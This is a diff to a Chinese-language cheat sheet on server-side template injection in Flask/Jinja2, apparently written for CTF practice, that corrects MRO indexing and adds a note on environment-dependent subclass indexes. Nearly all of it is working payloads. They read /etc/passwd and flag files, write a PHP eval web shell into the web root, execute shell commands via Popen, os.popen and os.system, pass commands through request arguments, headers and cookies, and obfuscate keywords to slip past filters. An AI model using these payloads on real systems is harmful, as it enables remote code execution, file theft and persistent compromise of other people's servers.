@@ -38,9 +38,11 @@ ${{7*7}}             # 可变语法
 | `${7*7}` → `49` | Smarty/Mako | PHP/Python |
 | `#{7*7}` → `49` | Pug/Jade | Node.js |
 | `<%=7*7%>` → `49` | EJS/ERB | Node.js/Ruby |
-| `{{7*7}}` → `7777777` | Jinja2 | Python |
+| `{{7*'7'}}` → `7777777` | Jinja2 | Python |
 
 ---
+
+> 适用条件：以下对象链依赖 Python 版本、模板上下文及沙箱策略。Python 3 的 `str.__mro__` 通常为 `(str, object)`；子类列表索引随运行环境变化，不能把 40、59、75 等编号当作通用值。优先通过类名与实际上下文定位，历史编号示例仅供理解。
 
 ## 二、Python Flask/Jinja2 完整攻击链
 
@@ -53,13 +55,13 @@ ${{7*7}}             # 可变语法
 {{[].__class__}}
 
 # 获取基类 (object)
-{{''.__class__.__mro__[2]}}           # 方法1: MRO链
+{{''.__class__.__mro__[-1]}}           # 方法1: MRO链
 {{''.__class__.__bases__[0]}}         # 方法2: bases
 {{''.__class__.__base__}}             # 方法3: base
 {{().__class__.__bases__[0]}}         # 方法4: 元组类
 
 # 获取所有子类
-{{''.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__mro__[-1].__subclasses__()}}
 {{[].__class__.__base__.__subclasses__()}}
 ```
 
@@ -67,7 +69,7 @@ ${{7*7}}             # 可变语法
 
 ```python
 # 方法1: FileLoader (索引40, 常见)
-{{''.__class__.__mro__[2].__subclasses__()[40]('fl4g').read()}}
+{{''.__class__.__mro__[-1].__subclasses__()[40]('fl4g').read()}}
 {{[].__class__.__base__.__subclasses__()[40]('flag').read()}}
 
 # 方法2: 通过 __builtins__.open
@@ -75,10 +77,10 @@ ${{7*7}}             # 可变语法
 {{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
 
 # 方法3: 通过 file (Python 2)
-{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()}}
+{{''.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()}}
 
 # 方法4: 文件写
-{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/shell.php','w').write('<?php @eval($_POST[1]);?>')}}
+{{''.__class__.__mro__[-1].__subclasses__()[40]('/var/www/html/shell.php','w').write('<?php @eval($_POST[1]);?>')}}
 {{().__class__.__bases__[0].__subclasses__()[40]('/tmp/shell','w').write('content')}}
 ```
 
@@ -113,14 +115,14 @@ ${{7*7}}             # 可变语法
 
 ```python
 # os.popen — 最直接 (索引258: os._wrap_close)
-{{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[-1].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
 
 # subprocess.Popen
-{{''.__class__.__mro__[2].__subclasses__()[258]('ls /flasklight',shell=True,stdout=-1).communicate()[0].strip()}}
-{{''.__class__.__mro__[2].__subclasses__()[258]('cat /flag',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[-1].__subclasses__()[258]('ls /flasklight',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[-1].__subclasses__()[258]('cat /flag',shell=True,stdout=-1).communicate()[0].strip()}}
 
 # eval+os.popen
-{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
+{{''.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
 
 # os.system
 {{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system('ls')}}
@@ -185,14 +187,14 @@ ${{7*7}}             # 可变语法
 ### 3.2 用 request 对象绕过
 
 ```python
-{{''.__class__.__mro__[2].__subclasses__()[258](request.args.cmd,shell=True,stdout=-1).communicate()}}&cmd=id
+{{''.__class__.__mro__[-1].__subclasses__()[258](request.args.cmd,shell=True,stdout=-1).communicate()}}&cmd=id
 
 # 用 headers 传递
-{{''.__class__.__mro__[2].__subclasses__()[258](request.headers.cmd,shell=True,stdout=-1).communicate()}}
+{{''.__class__.__mro__[-1].__subclasses__()[258](request.headers.cmd,shell=True,stdout=-1).communicate()}}
 # Header: cmd: id
 
 # 用 cookies 传递
-{{''.__class__.__mro__[2].__subclasses__()[258](request.cookies.cmd,shell=True,stdout=-1).communicate()}}
+{{''.__class__.__mro__[-1].__subclasses__()[258](request.cookies.cmd,shell=True,stdout=-1).communicate()}}
 # Cookie: cmd=id
 ```
 
@@ -203,7 +205,7 @@ ${{7*7}}             # 可变语法
 {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['__im'+'port__']('o'+'s').__dict__['po'+'pen'](request.args.a).read()}}&a=Y2F0IC9mbGFn
 
 # Hex编码
-{{''.__class__.__mro__[2].__subclasses__()[258](request.args.a,shell=True,stdout=-1).communicate()}}&a=cat%20/flag
+{{''.__class__.__mro__[-1].__subclasses__()[258](request.args.a,shell=True,stdout=-1).communicate()}}&a=cat%20/flag
 
 # Unicode编码
 {{()|attr('__class__')}}
